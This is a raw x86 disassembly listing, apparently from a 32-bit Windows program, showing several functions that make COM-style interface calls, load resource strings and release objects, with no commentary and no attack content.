  403ba4:	call   DWORD PTR ds:0x4121c0
  403baa:	mov    BYTE PTR [ebp-0x4],0x1
  403bae:	lea    ecx,[ebp-0x2c]
  403bb1:	call   DWORD PTR ds:0x4121c0
  403bb7:	mov    BYTE PTR [ebp-0x4],0x0
  403bbb:	lea    ecx,[ebp-0x34]
  403bbe:	call   DWORD PTR ds:0x4121c0
  403bc4:	or     DWORD PTR [ebp-0x4],0xffffffff
  403bc8:	lea    ecx,[ebp-0x24]
  403bcb:	call   DWORD PTR ds:0x4121c0
  403bd1:	xor    eax,eax
  403bd3:	inc    eax
  403bd4:	jmp    0x403c3a
  403bd6:	mov    eax,DWORD PTR [ebp-0x40]
  403bd9:	mov    ecx,DWORD PTR [eax+0x4]
  403bdc:	call   0x407454
  403be1:	mov    eax,0x403be7
  403be6:	ret    
  403be7:	mov    DWORD PTR [ebp-0x4],0x4
  403bee:	lea    ecx,[ebp-0x30]
  403bf1:	call   DWORD PTR ds:0x4121c0
  403bf7:	mov    BYTE PTR [ebp-0x4],0x3
  403bfb:	lea    ecx,[ebp-0x28]
  403bfe:	call   DWORD PTR ds:0x4121c0
  403c04:	mov    BYTE PTR [ebp-0x4],0x2
  403c08:	lea    ecx,[ebp-0x20]
  403c0b:	call   DWORD PTR ds:0x4121c0
  403c11:	mov    BYTE PTR [ebp-0x4],0x1
  403c15:	lea    ecx,[ebp-0x2c]
  403c18:	call   DWORD PTR ds:0x4121c0
  403c1e:	mov    BYTE PTR [ebp-0x4],0x0
  403c22:	lea    ecx,[ebp-0x34]
  403c25:	call   DWORD PTR ds:0x4121c0
  403c2b:	or     DWORD PTR [ebp-0x4],0xffffffff
  403c2f:	lea    ecx,[ebp-0x24]
  403c32:	call   DWORD PTR ds:0x4121c0
  403c38:	xor    eax,eax
  403c3a:	call   0x40ea30
  403c3f:	ret    
  403c40:	int3   
  403c41:	int3   
  403c42:	int3   
  403c43:	int3   
  403c44:	int3   
  403c45:	push   0x24
  403c47:	mov    eax,0x40ee42
  403c4c:	call   0x40eaf2
  403c51:	mov    edi,ecx
  403c53:	xor    ebx,ebx
  403c55:	mov    DWORD PTR [ebp-0x24],ebx
  403c58:	mov    DWORD PTR [ebp-0x20],ebx
  403c5b:	mov    DWORD PTR [ebp-0x18],ebx
  403c5e:	lea    ecx,[ebp-0x1c]
  403c61:	call   DWORD PTR ds:0x4121c4
  403c67:	mov    DWORD PTR [ebp-0x4],ebx
  403c6a:	lea    eax,[edi+0x18]
  403c6d:	push   eax
  403c6e:	mov    ecx,0x22d
  403c73:	call   0x4098dc
  403c78:	mov    edx,eax
  403c7a:	mov    ecx,DWORD PTR [edi+0x14]
  403c7d:	call   0x405320
  403c82:	mov    BYTE PTR [ebp-0x4],0x1
  403c86:	push   0x4014a4
  403c8b:	lea    ecx,[ebp-0x28]
  403c8e:	call   0x40594b
  403c93:	mov    BYTE PTR [ebp-0x4],0x2
  403c97:	mov    eax,DWORD PTR [eax]
  403c99:	test   eax,eax
  403c9b:	je     0x403ca1
  403c9d:	mov    ecx,DWORD PTR [eax]
  403c9f:	jmp    0x403ca3
  403ca1:	mov    ecx,ebx
  403ca3:	mov    eax,DWORD PTR [edi+0x10]
  403ca6:	mov    esi,DWORD PTR [eax]
  403ca8:	lea    edx,[ebp-0x18]
  403cab:	push   edx
  403cac:	push   ebx
  403cad:	push   0x30
  403caf:	push   ecx
  403cb0:	push   eax
  403cb1:	mov    ecx,DWORD PTR [esi+0x48]
  403cb4:	call   DWORD PTR ds:0x41228c
  403cba:	call   DWORD PTR [esi+0x48]
  403cbd:	mov    esi,eax
  403cbf:	mov    BYTE PTR [ebp-0x4],0x1
  403cc3:	lea    ecx,[ebp-0x28]
  403cc6:	call   0x4058ac
  403ccb:	test   esi,esi
  403ccd:	jns    0x403ceb
  403ccf:	mov    ecx,esi
  403cd1:	call   0x407454
  403cd6:	or     DWORD PTR [ebp-0x4],0xffffffff
  403cda:	lea    ecx,[ebp-0x1c]
  403cdd:	call   DWORD PTR ds:0x4121c0
  403ce3:	xor    eax,eax
  403ce5:	call   0x40ea30
  403cea:	ret    
  403ceb:	mov    DWORD PTR [ebp-0x4],ebx
  403cee:	mov    edx,DWORD PTR [edi+0x44]
  403cf1:	mov    ecx,DWORD PTR [ebp-0x18]
  403cf4:	call   0x4070c8
  403cf9:	test   eax,eax
  403cfb:	jns    0x403d20
  403cfd:	mov    ecx,eax
  403cff:	call   0x407454
  403d04:	mov    ecx,DWORD PTR [ebp-0x18]
  403d07:	test   ecx,ecx
  403d09:	je     0x403cd6
  403d0b:	mov    eax,DWORD PTR [ecx]
  403d0d:	push   ecx
  403d0e:	mov    esi,DWORD PTR [eax+0x8]
  403d11:	mov    ecx,esi
  403d13:	call   DWORD PTR ds:0x41228c
  403d19:	call   esi
  403d1b:	mov    DWORD PTR [ebp-0x18],ebx
  403d1e:	jmp    0x403cd6
  403d20:	mov    eax,DWORD PTR [ebp-0x18]
  403d23:	mov    esi,DWORD PTR [eax]
  403d25:	lea    ecx,[ebp-0x24]
  403d28:	push   ecx
  403d29:	lea    ecx,[ebp-0x20]
  403d2c:	push   ecx
  403d2d:	push   0x1
  403d2f:	push   0xffffffff
  403d31:	push   eax
  403d32:	mov    ecx,DWORD PTR [esi+0x10]
  403d35:	call   DWORD PTR ds:0x41228c
  403d3b:	call   DWORD PTR [esi+0x10]
  403d3e:	test   eax,eax
  403d40:	js     0x403cfd
  403d42:	mov    ecx,0x138d
  403d47:	call   0x4098dc
  403d4c:	push   eax
  403d4d:	lea    eax,[ebp-0x1c]
  403d50:	push   eax
  403d51:	mov    edx,0x4010e8
  403d56:	mov    ecx,DWORD PTR [ebp-0x20]
  403d59:	call   0x4078a4
  403d5e:	mov    ecx,DWORD PTR [ebp-0x18]
  403d61:	test   ecx,ecx
  403d63:	je     0x403d78
  403d65:	mov    eax,DWORD PTR [ecx]
  403d67:	push   ecx
  403d68:	mov    esi,DWORD PTR [eax+0x8]
  403d6b:	mov    ecx,esi
  403d6d:	call   DWORD PTR ds:0x41228c
  403d73:	call   esi
  403d75:	mov    DWORD PTR [ebp-0x18],ebx
  403d78:	mov    ecx,DWORD PTR [ebp-0x20]
  403d7b:	test   ecx,ecx
  403d7d:	je     0x403d92
  403d7f:	mov    eax,DWORD PTR [ecx]
  403d81:	push   ecx
  403d82:	mov    esi,DWORD PTR [eax+0x8]
  403d85:	mov    ecx,esi
  403d87:	call   DWORD PTR ds:0x41228c
  403d8d:	call   esi
  403d8f:	mov    DWORD PTR [ebp-0x20],ebx
  403d92:	push   ecx
  403d93:	push   DWORD PTR [ebp-0x1c]
  403d96:	push   0x15
  403d98:	xor    edx,edx
  403d9a:	mov    ecx,DWORD PTR [edi+0x30]
  403d9d:	call   0x40b94a
  403da2:	or     DWORD PTR [ebp-0x4],0xffffffff
  403da6:	lea    ecx,[ebp-0x1c]
  403da9:	call   DWORD PTR ds:0x4121c0
  403daf:	xor    eax,eax
  403db1:	inc    eax
  403db2:	jmp    0x403ce5
  403db7:	mov    eax,DWORD PTR [ebp-0x2c]
  403dba:	mov    ecx,DWORD PTR [eax+0x4]
  403dbd:	call   0x407454
  403dc2:	mov    eax,0x403cd6
  403dc7:	ret    
  403dc8:	int3   
  403dc9:	int3   
  403dca:	int3   
  403dcb:	int3   
  403dcc:	int3   
  403dcd:	push   0x24
  403dcf:	mov    eax,0x40ee7d
  403dd4:	call   0x40eaf2
  403dd9:	mov    ebx,ecx
  403ddb:	xor    esi,esi
  403ddd:	mov    DWORD PTR [ebp-0x24],esi
  403de0:	mov    edi,esi
  403de2:	mov    DWORD PTR [ebp-0x20],esi
  403de5:	mov    DWORD PTR [ebp-0x18],esi
  403de8:	lea    ecx,[ebp-0x1c]
  403deb:	call   DWORD PTR ds:0x4121c4
  403df1:	mov    DWORD PTR [ebp-0x4],esi
  403df4:	lea    eax,[ebx+0x18]
  403df7:	push   eax
  403df8:	mov    ecx,0x22e
  403dfd:	call   0x4098dc
  403e02:	mov    edx,eax
  403e04:	mov    ecx,DWORD PTR [ebx+0x14]
  403e07:	call   0x405320
  403e0c:	mov    BYTE PTR [ebp-0x4],0x1
  403e10:	push   0x4014c4
  403e15:	lea    ecx,[ebp-0x28]
  403e18:	call   0x40594b
  403e1d:	mov    BYTE PTR [ebp-0x4],0x2
  403e21:	mov    eax,DWORD PTR [eax]
  403e23:	test   eax,eax
  403e25:	je     0x403e2b
  403e27:	mov    ecx,DWORD PTR [eax]
  403e29:	jmp    0x403e2d
  403e2b:	mov    ecx,esi
  403e2d:	mov    eax,DWORD PTR [ebx+0x10]
  403e30:	mov    esi,DWORD PTR [eax]
  403e32:	lea    edx,[ebp-0x18]
  403e35:	push   edx
  403e36:	push   0x0
  403e38:	push   0x30
  403e3a:	push   ecx
  403e3b:	push   eax
  403e3c:	mov    ecx,DWORD PTR [esi+0x48]
  403e3f:	call   DWORD PTR ds:0x41228c
  403e45:	call   DWORD PTR [esi+0x48]
  403e48:	mov    esi,eax
  403e4a:	mov    BYTE PTR [ebp-0x4],0x1
  403e4e:	lea    ecx,[ebp-0x28]
  403e51:	call   0x4058ac
  403e56:	test   esi,esi
  403e58:	jns    0x403e76
  403e5a:	mov    ecx,esi
  403e5c:	call   0x407454
  403e61:	or     DWORD PTR [ebp-0x4],0xffffffff
  403e65:	lea    ecx,[ebp-0x1c]
  403e68:	call   DWORD PTR ds:0x4121c0
  403e6e:	xor    eax,eax
  403e70:	call   0x40ea30
  403e75:	ret    
  403e76:	and    DWORD PTR [ebp-0x4],0x0
  403e7a:	mov    edx,DWORD PTR [ebx+0x44]
  403e7d:	mov    ecx,DWORD PTR [ebp-0x18]
  403e80:	call   0x4070c8
  403e85:	test   eax,eax
  403e87:	jns    0x403ead
  403e89:	mov    ecx,eax
  403e8b:	call   0x407454
  403e90:	mov    ecx,DWORD PTR [ebp-0x18]
  403e93:	test   ecx,ecx
  403e95:	je     0x403e61
  403e97:	mov    eax,DWORD PTR [ecx]
  403e99:	push   ecx
  403e9a:	mov    esi,DWORD PTR [eax+0x8]
  403e9d:	mov    ecx,esi
  403e9f:	call   DWORD PTR ds:0x41228c
  403ea5:	call   esi
  403ea7:	and    DWORD PTR [ebp-0x18],0x0
  403eab:	jmp    0x403e61
  403ead:	mov    eax,DWORD PTR [ebp-0x18]
  403eb0:	mov    esi,DWORD PTR [eax]
  403eb2:	lea    ecx,[ebp-0x24]
  403eb5:	push   ecx
  403eb6:	lea    ecx,[ebp-0x20]
  403eb9:	push   ecx
  403eba:	push   0x1
  403ebc:	push   0xffffffff
  403ebe:	push   eax
  403ebf:	mov    ecx,DWORD PTR [esi+0x10]
  403ec2:	call   DWORD PTR ds:0x41228c
  403ec8:	call   DWORD PTR [esi+0x10]
  403ecb:	cmp    eax,0x1
  403ece:	je     0x403f4d
  403ed0:	test   eax,eax
  403ed2:	js     0x403e89
  403ed4:	mov    ecx,0x138d
  403ed9:	call   0x4098dc
  403ede:	push   eax
  403edf:	lea    eax,[ebp-0x1c]
  403ee2:	push   eax
  403ee3:	mov    edx,0x4010e8
  403ee8:	mov    ecx,DWORD PTR [ebp-0x20]
  403eeb:	call   0x4078a4
  403ef0:	mov    ecx,DWORD PTR [ebp-0x20]
  403ef3:	test   ecx,ecx
  403ef5:	je     0x403f0b
  403ef7:	mov    eax,DWORD PTR [ecx]
  403ef9:	push   ecx
  403efa:	mov    esi,DWORD PTR [eax+0x8]
  403efd:	mov    ecx,esi
  403eff:	call   DWORD PTR ds:0x41228c
  403f05:	call   esi
  403f07:	and    DWORD PTR [ebp-0x20],0x0
  403f0b:	test   edi,edi
  403f0d:	jne    0x403f28
  403f0f:	push   0x1b
  403f11:	xor    edx,edx
  403f13:	mov    ecx,DWORD PTR [ebx+0x30]
  403f16:	call   0x40b780
  403f1b:	mov    edi,eax
  403f1d:	test   edi,edi
  403f1f:	je     0x403f38
  403f21:	mov    ecx,edi
  403f23:	call   0x40b148
  403f28:	push   ecx
  403f29:	mov    edx,DWORD PTR [ebp-0x1c]
  403f2c:	mov    ecx,edi
  403f2e:	call   0x40b1ba
  403f33:	jmp    0x403ead
  403f38:	push   0x8000ffff
  403f3d:	call   DWORD PTR ds:0x412014
  403f43:	call   0x4095c0
  403f48:	jmp    0x403e90
  403f4d:	mov    ecx,DWORD PTR [ebp-0x18]
  403f50:	test   ecx,ecx
  403f52:	je     0x403f68
  403f54:	mov    eax,DWORD PTR [ecx]
  403f56:	push   ecx
  403f57:	mov    esi,DWORD PTR [eax+0x8]
  403f5a:	mov    ecx,esi
  403f5c:	call   DWORD PTR ds:0x41228c
  403f62:	call   esi
  403f64:	and    DWORD PTR [ebp-0x18],0x0
  403f68:	or     DWORD PTR [ebp-0x4],0xffffffff
  403f6c:	lea    ecx,[ebp-0x1c]
  403f6f:	call   DWORD PTR ds:0x4121c0
  403f75:	xor    eax,eax
  403f77:	inc    eax
  403f78:	jmp    0x403e70
  403f7d:	mov    eax,DWORD PTR [ebp-0x2c]
  403f80:	mov    ecx,DWORD PTR [eax+0x4]
  403f83:	call   0x407454
  403f88:	mov    eax,0x403e61
  403f8d:	ret    
  403f8e:	int3   
  403f8f:	int3   
  403f90:	int3   
  403f91:	int3   
  403f92:	int3   
  403f93:	push   0x34
  403f95:	mov    eax,0x40eeca
  403f9a:	call   0x40eaf2
  403f9f:	mov    ebx,ecx
  403fa1:	lea    ecx,[ebp-0x1c]
  403fa4:	call   DWORD PTR ds:0x4121c4
  403faa:	xor    ecx,ecx
  403fac:	mov    DWORD PTR [ebp-0x4],ecx
  403faf:	mov    eax,ecx
  403fb1:	mov    DWORD PTR [ebp-0x30],eax
  403fb4:	mov    DWORD PTR [ebp-0x34],ecx
  403fb7:	mov    edi,ecx
  403fb9:	mov    DWORD PTR [ebp-0x28],ecx
  403fbc:	mov    DWORD PTR [ebp-0x18],ecx
  403fbf:	lea    ecx,[ebp-0x24]
  403fc2:	call   DWORD PTR ds:0x4121c4
  403fc8:	mov    BYTE PTR [ebp-0x4],0x1
  403fcc:	lea    ecx,[ebp-0x20]
  403fcf:	call   DWORD PTR ds:0x4121c4
  403fd5:	mov    BYTE PTR [ebp-0x4],0x2
  403fd9:	lea    eax,[ebx+0x18]
  403fdc:	push   eax
  403fdd:	mov    ecx,0x22a
  403fe2:	call   0x4098dc
  403fe7:	mov    edx,eax
  403fe9:	mov    ecx,DWORD PTR [ebx+0x14]
  403fec:	call   0x405320
  403ff1:	mov    BYTE PTR [ebp-0x4],0x3
  403ff5:	push   0x4014ec
  403ffa:	lea    ecx,[ebp-0x2c]
  403ffd:	call   0x40594b
  404002:	mov    BYTE PTR [ebp-0x4],0x4
  404006:	mov    eax,DWORD PTR [eax]
  404008:	test   eax,eax
  40400a:	je     0x404010
  40400c:	mov    ecx,DWORD PTR [eax]
  40400e:	jmp    0x404012
  404010:	xor    ecx,ecx
  404012:	mov    eax,DWORD PTR [ebx+0x10]
  404015:	mov    esi,DWORD PTR [eax]
  404017:	lea    edx,[ebp-0x18]
  40401a:	push   edx
  40401b:	push   0x0
  40401d:	push   0x30
  40401f:	push   ecx
  404020:	push   eax
  404021:	mov    ecx,DWORD PTR [esi+0x48]
  404024:	call   DWORD PTR ds:0x41228c
  40402a:	call   DWORD PTR [esi+0x48]
  40402d:	mov    esi,eax
  40402f:	mov    BYTE PTR [ebp-0x4],0x3
  404033:	lea    ecx,[ebp-0x2c]
  404036:	call   0x4058ac
  40403b:	test   esi,esi
  40403d:	jns    0x40404f
  40403f:	mov    ecx,esi
  404041:	call   0x407454
  404046:	mov    BYTE PTR [ebp-0x4],0x1
  40404a:	jmp    0x40423b
  40404f:	mov    DWORD PTR [ebp-0x4],0x2
  404056:	mov    edx,DWORD PTR [ebx+0x44]
  404059:	mov    ecx,DWORD PTR [ebp-0x18]
  40405c:	call   0x4070c8
  404061:	test   eax,eax
  404063:	jns    0x404089
  404065:	mov    ecx,eax
  404067:	call   0x407454
  40406c:	mov    ecx,DWORD PTR [ebp-0x18]
  40406f:	test   ecx,ecx
  404071:	je     0x404046
  404073:	mov    eax,DWORD PTR [ecx]
  404075:	push   ecx
  404076:	mov    esi,DWORD PTR [eax+0x8]
  404079:	mov    ecx,esi
  40407b:	call   DWORD PTR ds:0x41228c
  404081:	call   esi
  404083:	and    DWORD PTR [ebp-0x18],0x0
  404087:	jmp    0x404046
  404089:	mov    BYTE PTR [ebp-0x4],0x6
  40408d:	mov    eax,DWORD PTR [ebp-0x18]
  404090:	mov    esi,DWORD PTR [eax]
  404092:	lea    ecx,[ebp-0x34]
  404095:	push   ecx
  404096:	lea    ecx,[ebp-0x28]
  404099:	push   ecx
  40409a:	push   0x1
  40409c:	push   0xffffffff
  40409e:	push   eax
  40409f:	mov    ecx,DWORD PTR [esi+0x10]
  4040a2:	call   DWORD PTR ds:0x41228c
  4040a8:	call   DWORD PTR [esi+0x10]
  4040ab:	cmp    eax,0x1
  4040ae:	je     0x4041ad
  4040b4:	test   eax,eax
  4040b6:	js     0x404065
  4040b8:	mov    esi,DWORD PTR [ebp-0x30]
  4040bb:	inc    esi
  4040bc:	mov    DWORD PTR [ebp-0x30],esi
  4040bf:	mov    DWORD PTR [ebp-0x38],esi
  4040c2:	mov    ecx,0x138d
  4040c7:	call   0x4098dc
  4040cc:	push   eax
  4040cd:	lea    eax,[ebp-0x24]
  4040d0:	push   eax
  4040d1:	mov    edx,0x4010e8
  4040d6:	mov    ecx,DWORD PTR [ebp-0x28]
  4040d9:	call   0x4078a4
  4040de:	mov    ecx,0x138d
  4040e3:	call   0x4098dc
  4040e8:	push   eax
  4040e9:	lea    eax,[ebp-0x20]
  4040ec:	push   eax
  4040ed:	mov    edx,0x401148
  4040f2:	mov    ecx,DWORD PTR [ebp-0x28]
  4040f5:	call   0x4078a4
  4040fa:	push   ecx
  4040fb:	lea    eax,[ebp-0x2c]
  4040fe:	push   eax
  4040ff:	mov    edx,0x40150c
  404104:	mov    ecx,DWORD PTR [ebp-0x28]
  404107:	call   0x40799a
  40410c:	cmp    DWORD PTR [ebp-0x2c],0x0
  404110:	jne    0x404124
  404112:	push   ecx
  404113:	lea    eax,[ebp-0x2c]
  404116:	push   eax
  404117:	mov    edx,0x401530
  40411c:	mov    ecx,DWORD PTR [ebp-0x28]
  40411f:	call   0x40799a
  404124:	mov    ecx,DWORD PTR [ebp-0x28]
  404127:	test   ecx,ecx
  404129:	je     0x404142
  40412b:	mov    eax,DWORD PTR [ecx]
  40412d:	push   ecx
  40412e:	mov    esi,DWORD PTR [eax+0x8]
  404131:	mov    ecx,esi
  404133:	call   DWORD PTR ds:0x41228c
  404139:	call   esi
  40413b:	and    DWORD PTR [ebp-0x28],0x0
  40413f:	mov    esi,DWORD PTR [ebp-0x30]
  404142:	test   edi,edi
  404144:	jne    0x404177
  404146:	push   0xe
  404148:	xor    edx,edx
  40414a:	mov    ecx,DWORD PTR [ebx+0x30]
  40414d:	call   0x40b780
  404152:	mov    edi,eax
  404154:	mov    DWORD PTR [ebp-0x3c],edi
  404157:	test   edi,edi
  404159:	jne    0x404170
  40415b:	push   0x8000ffff
  404160:	call   DWORD PTR ds:0x412014
  404166:	call   0x4095c0
  40416b:	jmp    0x40406c
  404170:	mov    ecx,edi
  404172:	call   0x40b148
  404177:	push   DWORD PTR [ebp-0x2c]
  40417a:	push   DWORD PTR [ebp-0x20]
  40417d:	push   DWORD PTR [ebp-0x24]
  404180:	push   esi
  404181:	push   0x6a
  404183:	pop    ecx
  404184:	call   0x4098dc
  404189:	push   eax
  40418a:	lea    eax,[ebp-0x1c]
  40418d:	push   eax
  40418e:	call   DWORD PTR ds:0x4121b4
  404194:	add    esp,0x18
  404197:	push   ecx
  404198:	mov    edx,DWORD PTR [ebp-0x1c]
  40419b:	mov    ecx,edi
  40419d:	call   0x40b1ba
  4041a2:	xor    eax,eax
  4041a4:	inc    eax
  4041a5:	cmp    eax,eax
  4041a7:	je     0x40408d
  4041ad:	mov    ecx,DWORD PTR [ebp-0x18]
  4041b0:	test   ecx,ecx
  4041b2:	je     0x4041c8
  4041b4:	mov    eax,DWORD PTR [ecx]
  4041b6:	push   ecx
  4041b7:	mov    esi,DWORD PTR [eax+0x8]
  4041ba:	mov    ecx,esi
  4041bc:	call   DWORD PTR ds:0x41228c
  4041c2:	call   esi
  4041c4:	and    DWORD PTR [ebp-0x18],0x0
  4041c8:	test   edi,edi
  4041ca:	je     0x4041f1
  4041cc:	mov    eax,DWORD PTR [ebp-0x30]
  4041cf:	push   eax
  4041d0:	push   0x69
  4041d2:	pop    ecx
  4041d3:	call   0x4098dc
  4041d8:	push   eax
  4041d9:	lea    eax,[ebp-0x1c]
  4041dc:	push   eax
  4041dd:	call   DWORD PTR ds:0x4121b4
  4041e3:	add    esp,0xc
  4041e6:	push   ecx
  4041e7:	push   DWORD PTR [ebp-0x1c]
  4041ea:	mov    ecx,edi
  4041ec:	call   0x40b42e
  4041f1:	xor    ebx,ebx
  4041f3:	inc    ebx
  4041f4:	mov    DWORD PTR [ebp-0x4],ebx
  4041f7:	lea    ecx,[ebp-0x20]
  4041fa:	call   DWORD PTR ds:0x4121c0
  404200:	mov    BYTE PTR [ebp-0x4],0x0
  404204:	lea    ecx,[ebp-0x24]
  404207:	call   DWORD PTR ds:0x4121c0
  40420d:	or     DWORD PTR [ebp-0x4],0xffffffff
  404211:	lea    ecx,[ebp-0x1c]
  404214:	call   DWORD PTR ds:0x4121c0
  40421a:	mov    eax,ebx
  40421c:	jmp    0x404260
  40421e:	push   0x8007000e
  404223:	call   DWORD PTR ds:0x412014
  404229:	call   0x4095c0
  40422e:	mov    eax,0x404234
  404233:	ret    
  404234:	mov    DWORD PTR [ebp-0x4],0x1
  40423b:	lea    ecx,[ebp-0x20]
  40423e:	call   DWORD PTR ds:0x4121c0
  404244:	mov    BYTE PTR [ebp-0x4],0x0
  404248:	lea    ecx,[ebp-0x24]
  40424b:	call   DWORD PTR ds:0x4121c0
  404251:	or     DWORD PTR [ebp-0x4],0xffffffff
  404255:	lea    ecx,[ebp-0x1c]
  404258:	call   DWORD PTR ds:0x4121c0
  40425e:	xor    eax,eax
  404260:	call   0x40ea30
  404265:	ret    
  404266:	mov    eax,DWORD PTR [ebp-0x40]
  404269:	mov    ecx,DWORD PTR [eax+0x4]
  40426c:	call   0x407454
  404271:	mov    eax,0x404234
  404276:	ret    
  404277:	int3   
  404278:	int3   
  404279:	int3   
  40427a:	int3   
  40427b:	int3   
  40427c:	push   0x24
  40427e:	mov    eax,0x40ef05
  404283:	call   0x40eaf2
  404288:	mov    edi,ecx
  40428a:	xor    ebx,ebx
  40428c:	mov    DWORD PTR [ebp-0x24],ebx
  40428f:	mov    DWORD PTR [ebp-0x20],ebx
  404292:	mov    DWORD PTR [ebp-0x18],ebx
  404295:	lea    ecx,[ebp-0x1c]
  404298:	call   DWORD PTR ds:0x4121c4
  40429e:	mov    DWORD PTR [ebp-0x4],ebx
  4042a1:	lea    eax,[edi+0x18]
  4042a4:	push   eax
  4042a5:	mov    ecx,0x22c
  4042aa:	call   0x4098dc
  4042af:	mov    edx,eax
  4042b1:	mov    ecx,DWORD PTR [edi+0x14]
  4042b4:	call   0x405320
  4042b9:	mov    BYTE PTR [ebp-0x4],0x1
  4042bd:	push   0x40154c
  4042c2:	lea    ecx,[ebp-0x28]
  4042c5:	call   0x40594b
  4042ca:	mov    BYTE PTR [ebp-0x4],0x2
  4042ce:	mov    eax,DWORD PTR [eax]
  4042d0:	test   eax,eax
  4042d2:	je     0x4042d8
  4042d4:	mov    ecx,DWORD PTR [eax]
  4042d6:	jmp    0x4042da
  4042d8:	mov    ecx,ebx
  4042da:	mov    eax,DWORD PTR [edi+0x10]
  4042dd:	mov    esi,DWORD PTR [eax]
  4042df:	lea    edx,[ebp-0x18]
  4042e2:	push   edx
  4042e3:	push   ebx
  4042e4:	push   0x30
  4042e6:	push   ecx
  4042e7:	push   eax
  4042e8:	mov    ecx,DWORD PTR [esi+0x48]
  4042eb:	call   DWORD PTR ds:0x41228c
  4042f1:	call   DWORD PTR [esi+0x48]
  4042f4:	mov    esi,eax
  4042f6:	mov    BYTE PTR [ebp-0x4],0x1
  4042fa:	lea    ecx,[ebp-0x28]
  4042fd:	call   0x4058ac
  404302:	test   esi,esi
  404304:	jns    0x404322
  404306:	mov    ecx,esi
  404308:	call   0x407454
  40430d:	or     DWORD PTR [ebp-0x4],0xffffffff
  404311:	lea    ecx,[ebp-0x1c]
  404314:	call   DWORD PTR ds:0x4121c0
  40431a:	xor    eax,eax
  40431c:	call   0x40ea30
  404321:	ret    
  404322:	mov    DWORD PTR [ebp-0x4],ebx
  404325:	mov    edx,DWORD PTR [edi+0x44]
  404328:	mov    ecx,DWORD PTR [ebp-0x18]
  40432b:	call   0x4070c8
  404330:	test   eax,eax
  404332:	jns    0x404357
  404334:	mov    ecx,eax
  404336:	call   0x407454
  40433b:	mov    ecx,DWORD PTR [ebp-0x18]
  40433e:	test   ecx,ecx
  404340:	je     0x40430d
  404342:	mov    eax,DWORD PTR [ecx]
  404344:	push   ecx
  404345:	mov    esi,DWORD PTR [eax+0x8]
  404348:	mov    ecx,esi
  40434a:	call   DWORD PTR ds:0x41228c
  404350:	call   esi
  404352:	mov    DWORD PTR [ebp-0x18],ebx
  404355:	jmp    0x40430d
  404357:	mov    eax,DWORD PTR [ebp-0x18]
  40435a:	mov    esi,DWORD PTR [eax]
  40435c:	lea    ecx,[ebp-0x24]
  40435f:	push   ecx
  404360:	lea    ecx,[ebp-0x20]
  404363:	push   ecx
  404364:	push   0x1
  404366:	push   0xffffffff
  404368:	push   eax
  404369:	mov    ecx,DWORD PTR [esi+0x10]
  40436c:	call   DWORD PTR ds:0x41228c
  404372:	call   DWORD PTR [esi+0x10]
  404375:	test   eax,eax
  404377:	js     0x404334
  404379:	mov    ecx,0x138d
  40437e:	call   0x4098dc
  404383:	push   eax
  404384:	lea    eax,[ebp-0x1c]
  404387:	push   eax
  404388:	mov    edx,0x40156c
  40438d:	mov    ecx,DWORD PTR [ebp-0x20]
  404390:	call   0x4078a4
  404395:	mov    ecx,DWORD PTR [ebp-0x18]
  404398:	test   ecx,ecx
  40439a:	je     0x4043af
  40439c:	mov    eax,DWORD PTR [ecx]
  40439e:	push   ecx
  40439f:	mov    esi,DWORD PTR [eax+0x8]
  4043a2:	mov    ecx,esi
  4043a4:	call   DWORD PTR ds:0x41228c
  4043aa:	call   esi
  4043ac:	mov    DWORD PTR [ebp-0x18],ebx
  4043af:	mov    ecx,DWORD PTR [ebp-0x20]
  4043b2:	test   ecx,ecx
  4043b4:	je     0x4043c9
  4043b6:	mov    eax,DWORD PTR [ecx]
  4043b8:	push   ecx
  4043b9:	mov    esi,DWORD PTR [eax+0x8]
  4043bc:	mov    ecx,esi
  4043be:	call   DWORD PTR ds:0x41228c
  4043c4:	call   esi
  4043c6:	mov    DWORD PTR [ebp-0x20],ebx
  4043c9:	lea    ecx,[ebp-0x1c]
  4043cc:	call   0x405407
  4043d1:	push   ecx
  4043d2:	push   DWORD PTR [ebp-0x1c]
  4043d5:	push   0x14
  4043d7:	xor    edx,edx
  4043d9:	mov    ecx,DWORD PTR [edi+0x30]
  4043dc:	call   0x40b94a
  4043e1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4043e5:	lea    ecx,[ebp-0x1c]
  4043e8:	call   DWORD PTR ds:0x4121c0
  4043ee:	xor    eax,eax
  4043f0:	inc    eax
  4043f1:	jmp    0x40431c
  4043f6:	mov    eax,DWORD PTR [ebp-0x2c]
  4043f9:	mov    ecx,DWORD PTR [eax+0x4]
  4043fc:	call   0x407454
  404401:	mov    eax,0x40430d
  404406:	ret    
  404407:	int3   
  404408:	int3   
  404409:	int3   
  40440a:	int3   
  40440b:	int3   
  40440c:	push   0x34
  40440e:	mov    eax,0x40ef5b
  404413:	call   0x40eaf2
  404418:	mov    ebx,ecx
  40441a:	lea    ecx,[ebp-0x1c]
  40441d:	call   DWORD PTR ds:0x4121c4
  404423:	xor    ecx,ecx
  404425:	mov    DWORD PTR [ebp-0x4],ecx
  404428:	mov    eax,ecx
  40442a:	mov    DWORD PTR [ebp-0x2c],eax
  40442d:	mov    DWORD PTR [ebp-0x34],ecx
  404430:	mov    edi,ecx
  404432:	mov    DWORD PTR [ebp-0x28],ecx
  404435:	mov    DWORD PTR [ebp-0x18],ecx
  404438:	lea    ecx,[ebp-0x24]
  40443b:	call   DWORD PTR ds:0x4121c4
  404441:	mov    BYTE PTR [ebp-0x4],0x1
  404445:	lea    ecx,[ebp-0x20]
  404448:	call   DWORD PTR ds:0x4121c4
  40444e:	mov    BYTE PTR [ebp-0x4],0x2
  404452:	lea    eax,[ebx+0x18]
  404455:	push   eax
  404456:	mov    ecx,0x22f
  40445b:	call   0x4098dc
  404460:	mov    edx,eax
  404462:	mov    ecx,DWORD PTR [ebx+0x14]
  404465:	call   0x405320
  40446a:	mov    BYTE PTR [ebp-0x4],0x3
  40446e:	push   0x40157c
  404473:	lea    ecx,[ebp-0x30]
  404476:	call   0x40594b
  40447b:	mov    BYTE PTR [ebp-0x4],0x4
  40447f:	mov    eax,DWORD PTR [eax]
  404481:	test   eax,eax
  404483:	je     0x404489
  404485:	mov    ecx,DWORD PTR [eax]
  404487:	jmp    0x40448b
  404489:	xor    ecx,ecx
  40448b:	mov    eax,DWORD PTR [ebx+0x10]
  40448e:	mov    esi,DWORD PTR [eax]
  404490:	lea    edx,[ebp-0x18]
  404493:	push   edx
  404494:	push   0x0
  404496:	push   0x30
  404498:	push   ecx
  404499:	push   eax
  40449a:	mov    ecx,DWORD PTR [esi+0x48]
  40449d:	call   DWORD PTR ds:0x41228c
  4044a3:	call   DWORD PTR [esi+0x48]
  4044a6:	mov    esi,eax
